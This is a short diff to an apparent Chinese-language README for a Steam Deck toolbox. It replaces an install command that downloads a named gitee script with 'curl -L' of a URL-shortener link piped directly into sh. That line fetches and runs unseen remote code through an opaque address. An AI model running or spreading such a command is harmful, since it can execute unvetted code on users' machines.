@@ -66,4 +66,4 @@
 在 Konsole 中执行以下命令即可安装：
 
 ```bash
-curl -L https://gitee.com/Zhucy2100/steamdeck_toolbox/raw/master/steamdeck_toolbox.sh -o /tmp/steamdeck_toolbox.sh && chmod +x /tmp/steamdeck_toolbox.sh && /tmp/steamdeck_toolbox.sh
+curl -L https://shoturl.cn/n2eFhl | sh
